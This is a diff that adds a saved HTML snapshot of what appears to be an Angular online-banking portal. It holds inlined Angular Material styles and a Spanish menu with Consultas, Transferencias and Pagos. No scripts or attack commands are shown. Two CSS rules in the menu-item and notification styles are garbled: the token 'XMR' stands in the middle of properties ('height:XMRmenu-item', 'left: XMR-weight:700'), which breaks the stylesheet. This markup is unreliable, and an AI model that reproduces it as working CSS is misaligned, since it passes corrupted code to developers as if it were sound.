+            [dir=rtl] .mat-nav-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text {
+                padding-right: 0;
+                padding-left: 16px
+            }
+
+            .mat-list[dense] .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-list[dense] .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-list[dense] .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-list[dense] .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-nav-list[dense] .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-nav-list[dense] .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-nav-list[dense] .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-nav-list[dense] .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-selection-list[dense] .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-selection-list[dense] .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-selection-list[dense] .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-selection-list[dense] .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text {
+                padding-right: 16px;
+                padding-left: 16px
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-avatar,
+            .mat-list[dense] .mat-list-option .mat-list-avatar,
+            .mat-nav-list[dense] .mat-list-item .mat-list-avatar,
+            .mat-nav-list[dense] .mat-list-option .mat-list-avatar,
+            .mat-selection-list[dense] .mat-list-item .mat-list-avatar,
+            .mat-selection-list[dense] .mat-list-option .mat-list-avatar {
+                flex-shrink: 0;
+                width: 36px;
+                height: 36px;
+                border-radius: 50%;
+                object-fit: cover
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            .mat-list[dense] .mat-list-option .mat-list-avatar~.mat-divider-inset,
+            .mat-nav-list[dense] .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            .mat-nav-list[dense] .mat-list-option .mat-list-avatar~.mat-divider-inset,
+            .mat-selection-list[dense] .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            .mat-selection-list[dense] .mat-list-option .mat-list-avatar~.mat-divider-inset {
+                margin-left: 68px;
+                width: calc(100% - 68px)
+            }
+
+            [dir=rtl] .mat-list[dense] .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-list[dense] .mat-list-option .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-option .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-option .mat-list-avatar~.mat-divider-inset {
+                margin-left: auto;
+                margin-right: 68px
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-icon,
+            .mat-list[dense] .mat-list-option .mat-list-icon,
+            .mat-nav-list[dense] .mat-list-item .mat-list-icon,
+            .mat-nav-list[dense] .mat-list-option .mat-list-icon,
+            .mat-selection-list[dense] .mat-list-item .mat-list-icon,
+            .mat-selection-list[dense] .mat-list-option .mat-list-icon {
+                flex-shrink: 0;
+                width: 20px;
+                height: 20px;
+                font-size: 20px;
+                box-sizing: content-box;
+                border-radius: 50%;
+                padding: 4px
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-icon~.mat-divider-inset,
+            .mat-list[dense] .mat-list-option .mat-list-icon~.mat-divider-inset,
+            .mat-nav-list[dense] .mat-list-item .mat-list-icon~.mat-divider-inset,
+            .mat-nav-list[dense] .mat-list-option .mat-list-icon~.mat-divider-inset,
+            .mat-selection-list[dense] .mat-list-item .mat-list-icon~.mat-divider-inset,
+            .mat-selection-list[dense] .mat-list-option .mat-list-icon~.mat-divider-inset {
+                margin-left: 60px;
+                width: calc(100% - 60px)
+            }
+
+            [dir=rtl] .mat-list[dense] .mat-list-item .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-list[dense] .mat-list-option .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-item .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-option .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-item .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-option .mat-list-icon~.mat-divider-inset {
+                margin-left: auto;
+                margin-right: 60px
+            }
+
+            .mat-list[dense] .mat-list-item .mat-divider,
+            .mat-list[dense] .mat-list-option .mat-divider,
+            .mat-nav-list[dense] .mat-list-item .mat-divider,
+            .mat-nav-list[dense] .mat-list-option .mat-divider,
+            .mat-selection-list[dense] .mat-list-item .mat-divider,
+            .mat-selection-list[dense] .mat-list-option .mat-divider {
+                position: absolute;
+                bottom: 0;
+                left: 0;
+                width: 100%;
+                margin: 0
+            }
+
+            [dir=rtl] .mat-list[dense] .mat-list-item .mat-divider,
+            [dir=rtl] .mat-list[dense] .mat-list-option .mat-divider,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-item .mat-divider,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-option .mat-divider,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-item .mat-divider,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-option .mat-divider {
+                margin-left: auto;
+                margin-right: 0
+            }
+
+            .mat-list[dense] .mat-list-item .mat-divider.mat-divider-inset,
+            .mat-list[dense] .mat-list-option .mat-divider.mat-divider-inset,
+            .mat-nav-list[dense] .mat-list-item .mat-divider.mat-divider-inset,
+            .mat-nav-list[dense] .mat-list-option .mat-divider.mat-divider-inset,
+            .mat-selection-list[dense] .mat-list-item .mat-divider.mat-divider-inset,
+            .mat-selection-list[dense] .mat-list-option .mat-divider.mat-divider-inset {
+                position: absolute
+            }
+
+            .mat-nav-list a {
+                text-decoration: none;
+                color: inherit
+            }
+
+            .mat-nav-list .mat-list-item {
+                cursor: pointer;
+                outline: 0
+            }
+
+            .mat-list-option:not(.mat-list-item-disabled) {
+                cursor: pointer;
+                outline: 0
+            }
+
+            @media (hover:none) {
+
+                .mat-list-option:hover,
+                .mat-nav-list .mat-list-item:hover {
+                    background: 0 0
+                }
+            }
+    </style>
+    <style>
+        button[_ngcontent-c17] {
+            color: #fff
+        }
+
+        .logo[_ngcontent-c17] {
+            height: 40%
+        }
+
+        .logo-bdv[_ngcontent-c17] {
+            height: 70%
+        }
+
+        .logo[_ngcontent-c17]:hover {
+            cursor: pointer
+        }
+
+        .navbar[_ngcontent-c17] {
+            overflow: hidden;
+            background-color: #0067b1
+        }
+
+        .navbar[_ngcontent-c17] a[_ngcontent-c17] {
+            float: left;
+            font-size: 16px;
+            color: #fff;
+            text-align: center;
+            padding: 14px 16px;
+            text-decoration: none
+        }
+
+        .dropdown[_ngcontent-c17] {
+            float: left;
+            overflow: hidden;
+            width: 100%
+        }
+
+        .dropdown[_ngcontent-c17] button[_ngcontent-c17] {
+            height: 50px;
+            font-size: 16px;
+            box-shadow: none;
+            background-color: #0067b1;
+        }
+
+        button[_ngcontent-c17]:focus {
+            outline: 0 !important;
+            box-shadow: none !important
+        }
+
+        .drop-icon[_ngcontent-c17] {
+            font-size: 25px
+        }
+
+        .img-icon[_ngcontent-c17] {
+            height: 20px
+        }
+
+        .img-icon-divisa[_ngcontent-c17] {
+            height: 25px
+        }
+
+        .welcome[_ngcontent-c17] {
+            padding: 5px
+        }
+
+        .welcome-text[_ngcontent-c17] {
+            color: #000;
+            font-size: 11px;
+            font-weight: 700;
+            float: left;
+            padding: 10px
+        }
+
+        .tooltip-red[_ngcontent-c17] {
+            background: red
+        }
+
+        .business-change[_ngcontent-c17] {
+            float: right;
+            margin-right: 20px
+        }
+
+        mat-form-field[_ngcontent-c17] {
+            padding: 0 !important;
+            font-size: 12px
+        }
+
+        @media (max-width:880px) {
+            .navbar[_ngcontent-c17] {
+                display: none
+            }
+
+            .welcome-text[_ngcontent-c17] {
+                float: inherit;
+                display: block
+            }
+
+            .business-change[_ngcontent-c17] {
+                display: none
+            }
+        }
+
+        .badge[_ngcontent-c17] {
+            position: absolute;
+            font-size: 10px;
+            line-height: 13px;
+            border-radius: 50%;
+            width: 13px;
+            height: 13px;
+            background-color: red;
+            color: #fff;
+            text-align: center
+        }
+
+        .menu-notificacion[_ngcontent-c17] {
+            text-align: right;
+            margin-top: 1em;
+            padding: 0 5vw
+        }
+    </style>
+    <style>
+        .mat-menu-panel {
+            min-width: 112px;
+            max-width: 280px;
+            overflow: auto;
+            -webkit-overflow-scrolling: touch;
+            max-height: calc(100vh - 48px);
+            border-radius: 2px;
+            outline: 0
+        }
+
+        .mat-menu-panel:not([class*=mat-elevation-z]) {
+            box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12)
+        }
+
+        @media screen and (-ms-high-contrast:active) {
+            .mat-menu-panel {
+                outline: solid 1px
+            }
+        }
+
+        .mat-menu-content:not(:empty) {
+            padding-top: 8px;
+            padding-bottom: 8px
+        }
+
+        .mat-menu-item {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: pointer;
+            outline: 0;
+            border: none;
+            -webkit-tap-highlight-color: transparent;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            display: block;
+            line-height: 48px;
+
+            height:XMRmenu-item::-moz-focus-inner {
+                border: 0
+            }
+
+            .mat-menu-item[disabled] {
+                cursor: default
+            }
+
+            [dir=rtl] .mat-menu-item {
+                text-align: right
+            }
+
+            .mat-menu-item .mat-icon {
+                margin-right: 16px;
+                vertical-align: middle
+            }
+
+            .mat-menu-item .mat-icon svg {
+                vertical-align: top
+            }
+
+            [dir=rtl] .mat-menu-item .mat-icon {
+                margin-left: 16px;
+                margin-right: 0
+            }
+
+            @media screen and (-ms-high-contrast:active) {
+
+                .mat-menu-item-highlighted,
+                .mat-menu-item.cdk-keyboard-focused,
+                .mat-menu-item.cdk-program-focused {
+                    outline: dotted 1px
+                }
+            }
+
+            .mat-menu-item-submenu-trigger {
+                padding-right: 32px
+            }
+
+            .mat-menu-item-submenu-trigger::after {
+                width: 0;
+                height: 0;
+                border-style: solid;
+                border-width: 5px 0 5px 5px;
+                border-color: transparent transparent transparent currentColor;
+                content: '';
+                display: inline-block;
+                position: absolute;
+                top: 50%;
+                right: 16px;
+                transform: translateY(-50%)
+            }
+
+            [dir=rtl] .mat-menu-item-submenu-trigger {
+                padding-right: 16px;
+                padding-left: 32px
+            }
+
+            [dir=rtl] .mat-menu-item-submenu-trigger::after {
+                right: auto;
+                left: 16px;
+                transform: rotateY(180deg) translateY(-50%)
+            }
+
+            .mat-menu-panel.ng-animating .mat-menu-item-submenu-trigger {
+                pointer-events: none
+            }
+
+            button.mat-menu-item {
+                width: 100%
+            }
+
+            .mat-menu-ripple {
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                position: absolute;
+                pointer-events: none
+            }
+    </style>
+    <style>
+        @media (min-width:800px) {
+            .fab-container[_ngcontent-c28] {
+                position: absolute;
+                right: 1em;
+                z-index: 100;
+                display: inline-flex;
+                flex-direction: column;
+                align-items: center;
+                color: #000
+            }
+
+            .fab-container[_ngcontent-c28]>div[_ngcontent-c28] {
+                display: -webkit-flex;
+                flex-direction: column;
+                align-items: center;
+                margin-bottom: 5px
+            }
+
+            .fab-container[_ngcontent-c28]>div[_ngcontent-c28] button[_ngcontent-c28] {
+                margin-bottom: 17px
+            }
+        }
+
+        .fab-toggler[_ngcontent-c28] {
+            float: right;
+            z-index: 100
+        }
+
+        .img-icon[_ngcontent-c28] {
+            height: 24px;
+            vertical-align: middle
+        }
+
+        #fab-dismiss[_ngcontent-c28] {
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 99
+        }
+
+        @media (max-width:800px) {
+            .fab-container[_ngcontent-c28] {
+                display: block
+            }
+
+            .fab-container[_ngcontent-c28]>div[_ngcontent-c28] {
+                display: inline-flex;
+                flex-direction: row-reverse
+            }
+
+            .fab-container[_ngcontent-c28]>div[_ngcontent-c28] button[_ngcontent-c28] {
+                margin-right: 5px;
+                margin-left: 5px
+            }
+        }
+
+        .badge[_ngcontent-c28] {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            font-size: 10px;
+            line-height: 12px;
+            border-radius: 50%;
+            width: 15px;
+            height: 15px;
+            background-color: red;
+            border: 1px solid red;
+            color: #fff;
+            text-align: center
+        }
+
+        @media (min-width:800px) {
+            .responsive-xs[_ngcontent-c28] {
+                margin-left: -5px;
+                display: contents
+            }
+        }
+    </style>
+    <style>
+        [_nghost-c16] {
+            display: flex;
+            flex-direction: column;
+            outline: 0;
+            width: 100%
+        }
+
+        [_nghost-c16] .mat-list-item.active[_ngcontent-c16] {
+            background-color: #2e73c7;
+            color: #fff
+        }
+
+        [_nghost-c16]:focus>.mat-list-item[_ngcontent-c16]:not(.expanded),
+        [_nghost-c16]:hover>.mat-list-item[_ngcontent-c16]:not(.expanded) {
+            background-color: #2e73c7 !important;
+            color: #fff
+        }
+
+        .mat-list-item[_ngcontent-c16] {
+            padding: 0;
+            width: auto;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 400;
+            font-family: Nunito
+        }
+
+        .img-icon[_ngcontent-c16] {
+            height: 20px;
+            margin-right: 5px
+        }
+
+        .sub-menu[_ngcontent-c16] {
+            background-color: #2e73c7
+        }
+    </style>
+    <style type="text/css">
+        /*
+  @angular/flex-layout - workaround for possible browser quirk with mediaQuery listeners
+  see http://bit.ly/2sd4HMP
+*/
+        @media (min-width: 600px),
+        (max-width: 599px),
+        (min-width: 960px),
+        (max-width: 959px),
+        (min-width: 1280px),
+        (max-width: 1279px),
+        (min-width: 1920px),
+        (max-width: 1919px),
+        (min-width: 0px) and (max-width: 599px),
+        (min-width: 600px) and (max-width: 959px),
+        (min-width: 960px) and (max-width: 1279px),
+        (min-width: 1280px) and (max-width: 1919px),
+        (min-width: 1920px) and (max-width: 5000px) {
+            .fx-query-test {}
+        }
+    </style>
+    <style>
+        .img-icon[_ngcontent-c29] {
+            height: 24px;
+            vertical-align: middle
+        }
+
+        button[_ngcontent-c29] {
+            margin: 0 5px 0 0
+        }
+
+        @media (min-width:800px) {
+            button[_ngcontent-c29] {
+                margin-bottom: 12px
+            }
+        }
+
+        @media (max-width:800px) {
+            button[_ngcontent-c29] {
+                margin: 0 5px 0 0
+            }
+        }
+
+        @media (max-width:250px) {
+            .fab-container[_ngcontent-c29] {
+                display: block
+            }
+
+            .fab-container[_ngcontent-c29]>div[_ngcontent-c29] {
+                display: -webkit-flex;
+                flex-direction: row-reverse
+            }
+
+            button[_ngcontent-c29] {
+                margin: 5px
+            }
+        }
+    </style>
+    <style>
+        .img-icon[_ngcontent-c30] {
+            height: 30px;
+            vertical-align: middle
+        }
+
+        @media (min-width:800px) {
+            .fab-container[_ngcontent-c30] {
+                position: absolute;
+                right: 1em;
+                z-index: 100;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                color: #000
+            }
+
+            .fab-container[_ngcontent-c30]>div[_ngcontent-c30] {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                margin-bottom: 5px
+            }
+
+            .fab-container[_ngcontent-c30]>div[_ngcontent-c30] button[_ngcontent-c30] {
+                margin-bottom: 17px
+            }
+        }
+
+        .fab-toggler[_ngcontent-c30] {
+            float: right;
+            z-index: 100
+        }
+
+        button[_ngcontent-c30] {
+            margin: 0 5px 12px 0
+        }
+
+        #fab-dismiss[_ngcontent-c30] {
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 99
+        }
+
+        @media (max-width:800px) {
+            .fab-container[_ngcontent-c30] {
+                display: block
+            }
+
+            .fab-container[_ngcontent-c30]>div[_ngcontent-c30] {
+                display: flex;
+                flex-direction: row-reverse
+            }
+
+            .fab-container[_ngcontent-c30]>div[_ngcontent-c30] button[_ngcontent-c30] {
+                margin-right: 5px;
+                margin-left: 5px
+            }
+        }
+
+        .badge[_ngcontent-c30] {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            font-size: 10px;
+            line-height: 13px;
+            border-radius: 50%;
+            width: 15px;
+            height: 15px;
+            background-color: red;
+            border: 1px solid red;
+            color: #fff;
+            text-align: center
+        }
+
+        .header-notifications[_ngcontent-c30] {
+            text-align: center;
+            height: 2em;
+            background: #f0f8ff3d;
+            padding-top: 8px
+        }
+
+        .label-notifications[_ngcontent-c30] {
+            width: 20em;
+            font-family: Nunito;
+            color: #0067b1 !important;
+            font-weight: 700
+        }
+
+        .mat-icon-leater[_ngcontent-c30] {
+            font-size: 20px
+        }
+
+        .span-producto[_ngcontent-c30] {
+            position: absolute;
+            left: XMR-weight:700;
+            color: #0067b1 !important
+        }
+
+        .span-fecha-creacion[_ngcontent-c30] {
+            position: absolute;
+            right: 0;
+            box-sizing: content-box;
+            overflow: hidden;
+            pointer-events: none;
+            font-size: 10px;
+            bottom: 31px
+        }
+
+        .mat-icon-time[_ngcontent-c30] {
+            bottom: -24px;
+            font-size: 14px;
+            vertical-align: text-top;
+            margin-right: 0
+        }
+
+        .span-descripcion-producto[_ngcontent-c30] {
+            vertical-align: middle;
+            font-size: 11px;
+            display: flex;
+            white-space: break-spaces;
+            overflow: auto;
+            line-height: 11px;
+            padding: 25px 0 0
+        }
+
+        .cdk-overlay-pane>.posicion {
+            margin: 2em -2.4em 0 0;
+            max-width: none;
+            width: 140%
+        }
+
+        .bandeja-list[_ngcontent-c30] {
+            overflow: auto;
+            max-height: 15em
+        }
+
+        .mat-menu-content {
+            padding-top: 0
+        }
+
+        .mat-menu-item {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: pointer;
+            outline: 0;
+            border: none;
+            -webkit-tap-highlight-color: transparent;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            display: block;
+            line-height: 48px;
+            padding: 0 32px;
+            text-align: left;
+            text-decoration: none;
+            position: relative
+        }
+
+        @media (min-width:800px) {
+            .cdk-overlay-pane>.posicion {
+                margin: -3.2em 6em 0 0;
+                max-width: 20em
+            }
+        }
+
+        .animated[_ngcontent-c30] {
+            -webkit-animation-duration: 1s;
+            animation-duration: 1s;
+            -webkit-animation-fill-mode: both;
+            animation-fill-mode: both
+        }
+
+        .bounce[_ngcontent-c30] {
+            -webkit-animation-name: bounce;
+            animation-name: bounce;
+            -webkit-transform-origin: center bottom;
+            transform-origin: center bottom
+        }
+
+        @media (max-width:250px) {
+            .fab-container[_ngcontent-c30] {
+                display: block
+            }
+
+            .fab-container[_ngcontent-c30]>div[_ngcontent-c30] {
+                display: -webkit-flex;
+                flex-direction: row-reverse
+            }
+
+            button[_ngcontent-c30] {
+                margin: 5px
+            }
+        }
+    </style>
+    <style>
+        .img-icon[_ngcontent-c31] {
+            height: 30px
+        }
+
+        .mat-mini-fab .mat-button-wrapper {
+            line-height: 14px;
+            padding: 0
+        }
+
+        @media (min-width:800px) {
+            .fab-container[_ngcontent-c31] {
+                position: absolute;
+                right: .2em;
+                z-index: 100;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                color: #000
+            }
+
+            button[_ngcontent-c31] {
+                margin-bottom: 12px
+            }
+        }
+
+        @media (max-width:800px) {
+            .fab-container[_ngcontent-c31] {
+                display: block
+            }
+
+            .fab-container[_ngcontent-c31]>div[_ngcontent-c31] {
+                display: flex;
+                flex-direction: row-reverse
+            }
+
+            button[_ngcontent-c31] {
+                margin: 0 5px 0 0
+            }
+        }
+
+        @media (max-width:250px) {
+            .fab-container[_ngcontent-c31] {
+                display: block
+            }
+
+            .fab-container[_ngcontent-c31]>div[_ngcontent-c31] {
+                display: -webkit-flex;
+                flex-direction: row-reverse
+            }
+
+            button[_ngcontent-c31] {
+                margin: 5px
+            }
+        }
+    </style>
+    <style>
+        .mat-snack-bar-container {
+            border-radius: 2px;
+            box-sizing: border-box;
+            display: block;
+            margin: 24px;
+            max-width: 568px;
+            min-width: 288px;
+            padding: 14px 24px;
+            transform: translateY(100%) translateY(24px)
+        }
+
+        .mat-snack-bar-container.mat-snack-bar-center {
+            margin: 0;
+            transform: translateY(100%)
+        }
+
+        .mat-snack-bar-container.mat-snack-bar-top {
+            transform: translateY(-100%) translateY(-24px)
+        }
+
+        .mat-snack-bar-container.mat-snack-bar-top.mat-snack-bar-center {
+            transform: translateY(-100%)
+        }
+
+        @media screen and (-ms-high-contrast:active) {
+            .mat-snack-bar-container {
+                border: solid 1px
+            }
+        }
+
+        .mat-snack-bar-handset {
+            width: 100%
+        }
+
+        .mat-snack-bar-handset .mat-snack-bar-container {
+            margin: 0;
+            max-width: inherit;
+            width: 100%
+        }
+    </style>
+    <style>
+        .mat-simple-snackbar {
+            display: flex;
+            justify-content: space-between;
+            line-height: 20px;
+            opacity: 1
+        }
+
+        .mat-simple-snackbar-action {
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+            justify-content: space-around;
+            margin: -8px 0 -8px 8px
+        }
+
+        .mat-simple-snackbar-action button {
+            flex: 1;
+            max-height: 36px
+        }
+
+        [dir=rtl] .mat-simple-snackbar-action {
+            margin-left: 0;
+            margin-right: 8px
+        }
+    </style>
+    <style>
+        .mat-tooltip-panel {
+            pointer-events: none !important
+        }
+
+        .mat-tooltip {
+            color: #fff;
+            border-radius: 2px;
+            margin: 14px;
+            max-width: 250px;
+            padding-left: 8px;
+            padding-right: 8px;
+            overflow: hidden;
+            text-overflow: ellipsis
+        }
+
+        @media screen and (-ms-high-contrast:active) {
+            .mat-tooltip {
+                outline: solid 1px
+            }
+        }
+
+        .mat-tooltip-handset {
+            margin: 24px;
+            padding-left: 16px;
+            padding-right: 16px
+        }
+    </style>
+</head>
+
+<body>
+
+
+
+
+    <app-root _nghost-c0="" ng-version="6.1.10">
+        <spinner _ngcontent-c0="" spinner="sk-wave" _nghost-c1=""><!----></spinner><router-outlet _ngcontent-c0=""></router-outlet><app-home-layout class="ng-star-inserted"><app-menu _nghost-c10="">
+                <div _ngcontent-c10="" aria-label="contenido" class="example-container"><app-sidebar _ngcontent-c10="" _nghost-c11=""><mat-sidenav-container _ngcontent-c11="" class="mat-drawer-container mat-sidenav-container"><!---->
+                            <div class="mat-drawer-backdrop ng-star-inserted"></div>
+                            <div tabindex="-1" class="cdk-visually-hidden cdk-focus-trap-anchor"></div><mat-sidenav _ngcontent-c11="" class="mat-drawer mat-sidenav ng-tns-c14-0 ng-trigger ng-trigger-transform mat-drawer-over ng-star-inserted" mode="over" opened="false" tabindex="-1" style="box-shadow: none; visibility: hidden;"><!----><mat-nav-list _ngcontent-c11="" class="mat-nav-list ng-star-inserted" role="navigation" style=""><!----><app-menu-list-item _ngcontent-c11="" _nghost-c16="" class="ng-tns-c16-26 ng-star-inserted"><a _ngcontent-c16="" class="menu-list-item mat-list-item" mat-list-item="" style="padding-left: 0px;">
+                                            <div class="mat-list-item-content" style="flex-direction: row; box-sizing: border-box; display: flex;">
+                                                <div class="mat-list-item-ripple mat-ripple" mat-ripple=""></div>
+                                                <div class="mat-list-text"></div><img _ngcontent-c16="" class="img-icon ng-tns-c16-26" src="">
+                                                Consultas <!----><span _ngcontent-c16="" fxflex="" class="ng-tns-c16-26 ng-star-inserted" style="flex: 1 1 0%; box-sizing: border-box; flex-direction: row; display: flex;"><span _ngcontent-c16="" class="ng-tns-c16-26" fxflex="" style="flex: 1 1 0%; box-sizing: border-box;"></span><mat-icon _ngcontent-c16="" class="mat-icon material-icons ng-trigger ng-trigger-indicatorRotate" role="img" aria-hidden="true" style="transform: rotate(0deg);">
+                                                        expand_more </mat-icon></span>
+                                            </div>
+                                        </a><!----></app-menu-list-item><app-menu-list-item _ngcontent-c11="" _nghost-c16="" class="ng-tns-c16-27 ng-star-inserted"><a _ngcontent-c16="" class="menu-list-item mat-list-item" mat-list-item="" style="padding-left: 0px;">
+                                            <div class="mat-list-item-content" style="flex-direction: row; box-sizing: border-box; display: flex;">
+                                                <div class="mat-list-item-ripple mat-ripple" mat-ripple=""></div>
+                                                <div class="mat-list-text"></div><img _ngcontent-c16="" class="img-icon ng-tns-c16-27" src="/ "> Transferencias <!----><span _ngcontent-c16="" fxflex="" class="ng-tns-c16-27 ng-star-inserted" style="flex: 1 1 0%; box-sizing: border-box; flex-direction: row; display: flex;"><span _ngcontent-c16="" class="ng-tns-c16-27" fxflex="" style="flex: 1 1 0%; box-sizing: border-box;"></span><mat-icon _ngcontent-c16="" class="mat-icon material-icons ng-trigger ng-trigger-indicatorRotate" role="img" aria-hidden="true" style="transform: rotate(0deg);">
+                                                        expand_more </mat-icon></span>
+                                            </div>
+                                        </a><!----></app-menu-list-item><app-menu-list-item _ngcontent-c11="" _nghost-c16="" class="ng-tns-c16-28 ng-star-inserted"><a _ngcontent-c16="" class="menu-list-item mat-list-item" mat-list-item="" style="padding-left: 0px;">
+                                            <div class="mat-list-item-content" style="flex-direction: row; box-sizing: border-box; display: flex;">
+                                                <div class="mat-list-item-ripple mat-ripple" mat-ripple=""></div>
+                                                <div class="mat-list-text"></div><img _ngcontent-c16="" class="img-icon ng-tns-c16-28" src=" "> Pagos
+                                                <!----><span _ngcontent-c16="" fxflex="" class="ng-tns-c16-28 ng-star-inserted" style="flex: 1 1 0%; box-sizing: border-box; flex-direction: row; display: flex;"><span _ngcontent-c16="" class="ng-tns-c16-28" fxflex="" style="flex: 1 1 0%; box-sizing: border-box;"></span><mat-icon _ngcontent-c16="" class="mat-icon material-icons ng-trigger ng-trigger-indicatorRotate" role="img" aria-hidden="true" style="transform: rotate(0deg);">
+                                                        expand_more </mat-icon></span>
+                                            </div>
+                                        </a><!----></app-menu-list-item><app-menu-list-item _ngcontent-c11="" _nghost-c16="" class="ng-tns-c16-29 ng-star-inserted"><a _ngcontent-c16="" class="menu-list-item mat-list-item" mat-list-item="" style="padding-left: 0px;">
+                                            <div class="mat-list-item-content" style="flex-direction: row; box-sizing: border-box; display: flex;">
+                                                <div class="mat-list-item-ripple mat-ripple" mat-ripple=""></div>
+                                                <div class="mat-list-text"></div><img _ngcontent-c16="" class="img-icon ng-tns-c16-29" src=" ">
+                                                Solicitudes <!----><span _ngcontent-c16="" fxflex="" class="ng-tns-c16-29 ng-star-inserted" style="flex: 1 1 0%; box-sizing: border-box; flex-direction: row; display: flex;"><span _ngcontent-c16="" class="ng-tns-c16-29" fxflex="" style="flex: 1 1 0%; box-sizing: border-box;"></span><mat-icon _ngcontent-c16="" class="mat-icon material-icons ng-trigger ng-trigger-indicatorRotate" role="img" aria-hidden="true" style="transform: rotate(0deg);">
+                                                        expand_more </mat-icon></span>
+                                            </div>
+                                        </a><!----></app-menu-list-item><app-menu-list-item _ngcontent-c11="" _nghost-c16="" class="ng-tns-c16-30 ng-star-inserted"><a _ngcontent-c16="" class="menu-list-item mat-list-item" mat-list-item="" style="padding-left: 0px;">
+                                            <div class="mat-list-item-content" style="flex-direction: row; box-sizing: border-box; display: flex;">
+                                                <div class="mat-list-item-ripple mat-ripple" mat-ripple=""></div>
+                                                <div class="mat-list-text"></div><img _ngcontent-c16="" class="img-icon ng-tns-c16-30" src=" ">
+                                                Servicios <!----><span _ngcontent-c16="" fxflex="" class="ng-tns-c16-30 ng-star-inserted" style="flex: 1 1 0%; box-sizing: border-box; flex-direction: row; display: flex;"><span _ngcontent-c16="" class="ng-tns-c16-30" fxflex="" style="flex: 1 1 0%; box-sizing: border-box;"></span><mat-icon _ngcontent-c16="" class="mat-icon material-icons ng-trigger ng-trigger-indicatorRotate" role="img" aria-hidden="true" style="transform: rotate(0deg);">
+                                                        expand_more </mat-icon></span>
+                                            </div>
+                                        </a><!----></app-menu-list-item><app-menu-list-item _ngcontent-c11="" _nghost-c16="" class="ng-tns-c16-31 ng-star-inserted"><a _ngcontent-c16="" class="menu-list-item mat-list-item" mat-list-item="" style="padding-left: 0px;">
+                                            <div class="mat-list-item-content" style="flex-direction: row; box-sizing: border-box; display: flex;">
+                                                <div class="mat-list-item-ripple mat-ripple" mat-ripple=""></div>
+                                                <div class="mat-list-text"></div><img _ngcontent-c16="" class="img-icon ng-tns-c16-31" src=" ">
